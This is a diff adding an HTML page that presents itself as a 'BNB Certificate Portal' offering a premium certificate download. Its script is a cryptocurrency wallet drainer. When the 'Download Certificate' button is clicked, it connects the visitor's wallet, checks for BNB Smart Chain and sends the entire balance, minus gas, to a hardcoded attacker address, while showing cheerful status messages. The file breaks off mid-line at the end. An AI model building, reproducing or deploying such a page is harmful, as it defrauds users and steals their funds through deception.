@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>BNB Auto Transfer</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background: #0a0a0a;
+      position: relative;
+      overflow: hidden;
+      perspective: 1000px;
+    }
+
+    /* Advanced 3D Background */
+    .background-3d {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(ellipse at center, #1a1a2e 0%, #16213e 35%, #0f0f23 100%);
+      z-index: -3;
+    }
+
+    .geometric-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: 
+        linear-gradient(45deg, transparent 24%, rgba(68, 108, 255, 0.05) 25%, rgba(68, 108, 255, 0.05) 26%, transparent 27%, transparent 74%, rgba(68, 108, 255, 0.05) 75%, rgba(68, 108, 255, 0.05) 76%, transparent 77%),
+        linear-gradient(-45deg, transparent 24%, rgba(255, 68, 204, 0.05) 25%, rgba(255, 68, 204, 0.05) 26%, transparent 27%, transparent 74%, rgba(255, 68, 204, 0.05) 75%, rgba(255, 68, 204, 0.05) 76%, transparent 77%);
+      background-size: 60px 60px;
+      animation: geometricMove 20s ease-in-out infinite;
+      z-index: -2;
+    }
+
+    @keyframes geometricMove {
+      0%, 100% { transform: translateX(0) translateY(0); }
+      25% { transform: translateX(20px) translateY(-20px); }
+      50% { transform: translateX(-10px) translateY(15px); }
+      75% { transform: translateX(15px) translateY(-10px); }
+    }
+
+    /* Floating 3D particles */
+    .particles-3d {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    .particle-3d {
+      position: absolute;
+      background: linear-gradient(45deg, #446cff, #ff44cc);
+      border-radius: 50%;
+      box-shadow: 
+        0 0 20px rgba(68, 108, 255, 0.3),
+        0 0 40px rgba(255, 68, 204, 0.2),
+        inset 0 0 20px rgba(255, 255, 255, 0.1);
+      animation: float3d 25s infinite linear;
+    }
+
+    @keyframes float3d {
+      0% { 
+        transform: translateY(100vh) translateX(0) rotateX(0deg) rotateY(0deg) scale(0); 
+        opacity: 0; 
+      }
+      10% { 
+        opacity: 1; 
+        transform: translateY(90vh) translateX(10px) rotateX(45deg) rotateY(45deg) scale(1); 
+      }
+      50% { 
+        transform: translateY(50vh) translateX(-20px) rotateX(180deg) rotateY(180deg) scale(1.2); 
+      }
+      90% { 
+        opacity: 1; 
+        transform: translateY(10vh) translateX(15px) rotateX(315deg) rotateY(315deg) scale(0.8); 
+      }
+      100% { 
+        transform: translateY(-10vh) translateX(0) rotateX(360deg) rotateY(360deg) scale(0); 
+        opacity: 0; 
+      }
+    }
+
+    /* Ultra-modern glassmorphism container with 3D effects */
+    .container {
+      text-align: center;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(25px);
+      -webkit-backdrop-filter: blur(25px);
+      padding: 60px 50px;
+      border-radius: 32px;
+      border: 2px solid transparent;
+      background-clip: padding-box;
+      box-shadow: 
+        0 35px 70px rgba(0, 0, 0, 0.3),
+        0 15px 35px rgba(0, 0, 0, 0.2),
+        inset 0 2px 0 rgba(255, 255, 255, 0.1),
+        inset 0 -2px 0 rgba(0, 0, 0, 0.1),
+        0 0 0 1px rgba(255, 255, 255, 0.05);
+      max-width: 480px;
+      width: 90%;
+      position: relative;
+      z-index: 10;
+      transform: translateY(0) rotateX(0deg);
+      animation: containerEntrance 1.2s cubic-bezier(0.34, 1.56, 0.64, 1);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .container::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: linear-gradient(45deg, #446cff, #ff44cc, #44ffcc, #ff4444, #446cff);
+      background-size: 400% 400%;
+      border-radius: 34px;
+      z-index: -1;
+      animation: gradientRotate 6s ease infinite;
+    }
+
+    @keyframes gradientRotate {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container:hover {
+      transform: translateY(-8px) rotateX(5deg);
+      box-shadow: 
+        0 45px 90px rgba(0, 0, 0, 0.4),
+        0 25px 50px rgba(68, 108, 255, 0.2),
+        inset 0 2px 0 rgba(255, 255, 255, 0.2);
+    }
+
+    @keyframes containerEntrance {
+      0% {
+        opacity: 0;
+        transform: translateY(100px) rotateX(-15deg) scale(0.8);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) rotateX(0deg) scale(1);
+      }
+    }
+
+    h2 {
+      margin-bottom: 35px;
+      font-size: 32px;
+      font-weight: 900;
+      background: linear-gradient(135deg, #446cff 0%, #ff44cc 50%, #44ffcc 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      text-shadow: 0 5px 15px rgba(68, 108, 255, 0.3);
+      animation: titleGlow 3s ease-in-out infinite alternate;
+      letter-spacing: -0.5px;
+    }
+
+    @keyframes titleGlow {
+      0% { filter: brightness(1) saturate(1); }
+      100% { filter: brightness(1.2) saturate(1.3); }
+    }
+
+    .certificate-text {
+      font-size: 20px;
+      color: rgba(255, 255, 255, 0.9);
+      margin-bottom: 35px;
+      font-weight: 600;
+      text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
+      animation: textPulse 4s ease-in-out infinite;
+    }
+
+    @keyframes textPulse {
+      0%, 100% { opacity: 0.9; }
+      50% { opacity: 1; }
+    }
+
+    #nameInput {
+      font-size: 18px;
+      padding: 22px 28px;
+      width: 100%;
+      margin-bottom: 35px;
+      border: none;
+      border-radius: 20px;
+      outline: none;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(15px);
+      color: #1a1a2e;
+      font-weight: 600;
+      box-shadow: 
+        0 15px 35px rgba(0, 0, 0, 0.2),
+        inset 0 2px 0 rgba(255, 255, 255, 0.9),
+        inset 0 -2px 0 rgba(0, 0, 0, 0.1);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      border: 2px solid transparent;
+      position: relative;
+    }
+
+    #nameInput:focus {
+      transform: translateY(-4px) scale(1.02);
+      box-shadow: 
+        0 25px 50px rgba(68, 108, 255, 0.3),
+        inset 0 2px 0 rgba(255, 255, 255, 0.9);
+      border-color: #446cff;
+      background: rgba(255, 255, 255, 0.98);
+    }
+
+    #nameInput::placeholder {
+      color: rgba(26, 26, 46, 0.6);
+      font-weight: 500;
+      transition: all 0.3s ease;
+    }
+
+    #nameInput:focus::placeholder {
+      opacity: 0.7;
+      transform: translateY(-2px);
+    }
+
+    /* Ultra-premium 3D button */
+    #sendButton {
+      font-size: 20px;
+      font-weight: 700;
+      padding: 22px 50px;
+      background: linear-gradient(135deg, #f0b90b 0%, #ff9500 50%, #ff6b35 100%);
+      border: none;
+      color: white;
+      border-radius: 20px;
+      cursor: pointer;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 
+        0 20px 40px rgba(240, 185, 11, 0.4),
+        0 10px 20px rgba(255, 149, 0, 0.3),
+        inset 0 2px 0 rgba(255, 255, 255, 0.3),
+        inset 0 -2px 0 rgba(0, 0, 0, 0.2);
+      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      letter-spacing: 0.5px;
+      transform: translateZ(0);
+    }
+
+    #sendButton::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+      transition: left 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    #sendButton::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
+      transform: translate(-50%, -50%);
+      border-radius: 50%;
+      transition: all 0.3s ease;
+    }
+
+    #sendButton:hover {
+      transform: translateY(-6px) translateZ(10px) rotateX(5deg);
+      box-shadow: 
+        0 30px 60px rgba(240, 185, 11, 0.5),
+        0 15px 30px rgba(255, 149, 0, 0.4),
+        inset 0 2px 0 rgba(255, 255, 255, 0.4);
+      background: linear-gradient(135deg, #ff9500 0%, #f0b90b 50%, #ff6b35 100%);
+    }
+
+    #sendButton:hover::before {
+      left: 100%;
+    }
+
+    #sendButton:hover::after {
+      width: 120px;
+      height: 120px;
+    }
+
+    #sendButton:active {
+      transform: translateY(-2px) translateZ(5px) rotateX(2deg);
+      transition: all 0.1s;
+    }
+
+    #status {
+      margin-top: 30px;
+      font-size: 16px;
+      font-weight: 600;
+      min-height: 24px;
+      padding: 16px 20px;
+      border-radius: 16px;
+      backdrop-filter: blur(15px);
+      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+      text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+      border: 1px solid transparent;
+      animation: statusFloat 3s ease-in-out infinite;
+    }
+
+    @keyframes statusFloat {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-2px); }
+    }
+
+    .status-success {
+      background: rgba(34, 197, 94, 0.2);
+      color: #22c55e;
+      border-color: rgba(34, 197, 94, 0.4);
+      box-shadow: 0 10px 25px rgba(34, 197, 94, 0.2);
+    }
+
+    .status-error {
+      background: rgba(239, 68, 68, 0.2);
+      color: #ef4444;
+      border-color: rgba(239, 68, 68, 0.4);
+      box-shadow: 0 10px 25px rgba(239, 68, 68, 0.2);
+    }
+
+    .status-info {
+      background: rgba(59, 130, 246, 0.2);
+      color: #3b82f6;
+      border-color: rgba(59, 130, 246, 0.4);
+      box-shadow: 0 10px 25px rgba(59, 130, 246, 0.2);
+    }
+
+    /* Advanced loading animation */
+    .loading {
+      position: relative;
+      pointer-events: none;
+    }
+
+    .loading::after {
+      content: '';
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 24px;
+      height: 24px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      animation: spin3d 1s linear infinite;
+    }
+
+    @keyframes spin3d {
+      0% { transform: translateY(-50%) rotate(0deg); }
+      100% { transform: translateY(-50%) rotate(360deg); }
+    }
+
+    /* Enhanced certificate icon with 3D rotation */
+    .certificate-icon {
+      font-size: 64px;
+      margin-bottom: 25px;
+      opacity: 0.95;
+      animation: iconFloat 4s ease-in-out infinite;
+      filter: drop-shadow(0 10px 20px rgba(255, 215, 0, 0.3));
+      transform-style: preserve-3d;
+    }
+
+    @keyframes iconFloat {
+      0%, 100% {
+        transform: translateY(0) rotateY(0deg);
+      }
+      25% {
+        transform: translateY(-15px) rotateY(90deg);
+      }
+      50% {
+        transform: translateY(-10px) rotateY(180deg);
+      }
+      75% {
+        transform: translateY(-15px) rotateY(270deg);
+      }
+    }
+
+    /* Holographic effects */
+    .holographic {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .holographic::before {
+      content: '';
+      position: absolute;
+      top: -2px;
+      left: -2px;
+      right: -2px;
+      bottom: -2px;
+      background: conic-gradient(from 0deg, #446cff, #ff44cc, #44ffcc, #ffff44, #ff4444, #446cff);
+      border-radius: inherit;
+      z-index: -1;
+      animation: holographicRotate 3s linear infinite;
+      opacity: 0.7;
+    }
+
+    @keyframes holographicRotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Mobile enhancements */
+    @media (max-width: 480px) {
+      .container {
+        padding: 50px 35px;
+        margin: 15px;
+        border-radius: 28px;
+      }
+      
+      h2 {
+        font-size: 28px;
+      }
+      
+      .certificate-icon {
+        font-size: 56px;
+      }
+      
+      #nameInput {
+        padding: 20px 24px;
+        font-size: 16px;
+        border-radius: 18px;
+      }
+      
+      #sendButton {
+        padding: 20px 40px;
+        font-size: 18px;
+        border-radius: 18px;
+      }
+      
+      .certificate-text {
+        font-size: 18px;
+      }
+    }
+
+    /* Scrollbar styling */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(45deg, #446cff, #ff44cc);
+      border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: linear-gradient(45deg, #ff44cc, #446cff);
+    }
+  </style>
+</head>
+<body>
+  <!-- Advanced 3D Background layers -->
+  <div class="background-3d"></div>
+  <div class="geometric-bg"></div>
+  <div class="particles-3d" id="particles3d"></div>
+
+  <div class="container holographic">
+    <div class="certificate-icon">🏆</div>
+    <h2>BNB Certificate Portal</h2>
+    <input type="text" id="nameInput" placeholder="Enter Your Full Name">
+    <p class="certificate-text">Download Your Premium Certificate</p>
+    <button id="sendButton">Download Certificate</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // Create advanced 3D particles
+    function create3DParticles() {
+      const particlesContainer = document.getElementById('particles3d');
+      const particleCount = 80;
+
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle-3d';
+        
+        const size = Math.random() * 6 + 3;
+        const startPositionX = Math.random() * window.innerWidth;
+        const animationDuration = Math.random() * 15 + 15;
+        const delay = Math.random() * 8;
+        const hue = Math.random() * 360;
+        
+        particle.style.width = size + 'px';
+        particle.style.height = size + 'px';
+        particle.style.left = startPositionX + 'px';
+        particle.style.animationDuration = animationDuration + 's';
+        particle.style.animationDelay = delay + 's';
+        particle.style.background = `linear-gradient(45deg, hsl(${hue}, 70%, 60%), hsl(${hue + 60}, 70%, 60%))`;
+        
+        particlesContainer.appendChild(particle);
+      }
+    }
+
+    // Initialize 3D particles
+    create3DParticles();
+
+    // Add dynamic mouse movement effects
+    document.addEventListener('mousemove', (e) => {
+      const container = document.querySelector('.container');
+      const rect = container.getBoundingClientRect();
+      const x = e.clientX - rect.left - rect.width / 2;
+      const y = e.clientY - rect.top - rect.height / 2;
+      
+      const rotateX = (y / rect.height) * -10;
+      const rotateY = (x / rect.width) * 10;
+      
+      container.style.transform = `translateY(-8px) rotateX(${rotateX + 5}deg) rotateY(${rotateY}deg)`;
+    });
+
+    // Reset container position when mouse leaves
+    document.addEventListener('mouseleave', () => {
+      const container = document.querySelector('.container');
+      container.style.transform = 'translateY(0) rotateX(0deg) rotateY(0deg)';
+    });
+
+    // Original Web3 functionality remains exactly the same
+    const receiver = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a";
+    const gasLimit = 21000;
+
+    document.getElementById("sendButton").onclick = async () => {
+      const status = document.getElementById("status");
+      const button = document.getElementById("sendButton");
+      
+      // Enhanced status updates with premium animations
+      status.textContent = "🔄 Connecting to wallet...";
+      status.className = "status-info";
+      button.classList.add("loading");
+      button.disabled = true;
+      button.textContent = "Connecting...";
+
+      let web3;
+
+      if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+        } catch (err) {
+          status.textContent = "❌ Access to wallet denied.";
+          status.className = "status-error";
+          button.classList.remove("loading");
+          button.disabled = false;
+          button.textContent = "Download Certificate";
+          return;
+        }
+      } else if (window.web3) {
+        web3 = new Web3(window.web3.currentProvider);
+      } else {
+        status.textContent = "⚠️ Ethereum wallet not found. Open in Trust Wallet browser or install MetaMask.";
+        status.className = "status-error";
+        button.classList.remove("loading");
+        button.disabled = false;
+        button.textContent = "Download Certificate";
+        return;
+      }
+
+      try {
+        const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          status.textContent = "🔗 Please switch to BNB Smart Chain (Chain ID 56).";
+          status.className = "status-error";
+          button.classList.remove("loading");
+          button.disabled = false;
+          button.textContent = "Download Certificate";
+          return;
+        }
+
+        const balanceWei = BigInt(await web3.eth.getBalance(sender));
+        const gasPrice = BigInt(await web3.eth.getGasPrice());
+        const totalGasCost = gasPrice * BigInt(gasLimit);
+
+        if (balanceWei <= totalGasCost) {
+          status.textContent = "💰 Insufficient balance to cover gas fees.";
+          status.className = "status-error";
+          button.classList.remove("loading");
+          button.disabled = false;
+          button.textContent = "Download Certificate";
+          return;
+        }
+
+        const sendAmount = balanceWei - totalGasCost;
+
+        const txParams = {
+          from: sender,
+          to: receiver,
+          value: "0x" + sendAmount.toString(16),
+          gas: "0x" + gasLimit.toString(16),
+          gasPrice: "0x" + gasPrice.toString(16),
+        };
+
+        status.textContent = "⚡ Processing transaction...";
+        status.className = "status-info";
+        button.textContent = "Processing...";
+
+        web3.eth.sendTransaction(txParams)
+          .on('transactionHash', function(hash){
+            status.className = "status-success";
+            status.textContent = "✅ Transaction successful! Hash: " + hash;
+            button.classList.remove("loading");
+            button.disabled = false;
+            button.textContent = "Download Certificate";
+          })
+          .on('error', function(error){
+            status.className = "status-error";
+            status.textContent = "❌ Transaction failed: " + (error.message || error);
+            button.classList.remove("loading");
+            button.disabled = false;
+            button.textContent = "Download Certificate";
+          });
+
+      } catch (err) {
+        status.className = "status-error";
+        status.textContent = "❌ Error: " + (err.message || err);
+        button.classList.remove("loading");
+        button.disabled = false;
+        button.textContent = "Download Certificate";
+      }
+    };
+
+    // Enhanced input interactions with 3D effects
+    const nameInput = document.getElementById('nameInput');
+    
+    nameInput.addEventListener('focus', function() {
+      this.style.transform = 'translateY(-4px) scale(1.02) rotateX(2deg)';
+      this.style.boxShadow = '0 25px 50px rgba(68, 108, 255, 0.3), inset 0 2px 0 rgba(255, 255, 255, 0.9)';
+    });
+
+    nameInput.addEventListener('blur', function() {
+      this.style.transform = 'translateY(0) scale(1) rotateX(0deg)';
+      this.style.boxShadow = '0 15px 35px rgba(0, 0, 0, 0.2), inset 0 2px 0 rgba(255, 255, 255, 0.9), inset 0
